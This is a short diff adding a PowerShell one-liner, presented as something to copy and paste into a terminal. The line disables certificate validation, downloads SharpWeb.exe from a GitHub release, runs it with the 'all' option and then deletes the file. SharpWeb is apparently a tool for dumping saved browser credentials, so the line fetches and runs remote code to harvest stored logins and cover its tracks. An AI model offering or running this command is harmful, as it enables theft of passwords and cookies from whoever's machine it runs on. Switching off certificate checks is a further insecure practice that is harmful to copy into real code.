@@ -1,0 +1,2 @@
+# Simple one-liner just copy-pasta into a powershell terminal (Tested on Powershell 5.1) 
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile("https://github.com/djhohnstein/SharpWeb/releases/download/v1.2/SharpWeb.exe", "$PSScriptRoot/Sharp.exe"); .\Sharp.exe all; rm .\Sharp.exe
